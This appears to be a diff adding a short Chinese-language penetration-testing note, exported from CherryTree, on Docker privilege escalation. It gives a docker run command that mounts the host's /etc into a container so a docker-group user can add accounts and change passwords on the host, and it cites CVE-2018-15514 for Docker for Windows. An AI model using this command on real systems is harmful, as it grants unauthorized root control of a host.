@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>docker提权</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>docker提权</h1><br/><br />前提：<br />当前用户在docker组内<br /><br />docker run -it --rm -v /etc:/etc xxx /bin/bash<br /><br /><br /><br /><br />--rm 表示退出后删除docker容器<br />使用-v挂载关键文件<br /><br /><br />然后在docker里正常添加用户修改密码后<br />在宿主机中也可以同步修改<br /><br /><br />Docker for Windows<br />18.06.0-ce-rc3-win68 (edge)和18.06.0-ce-win72 (stable）版本之前<br />漏洞编号 CVE-2018-15514<br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
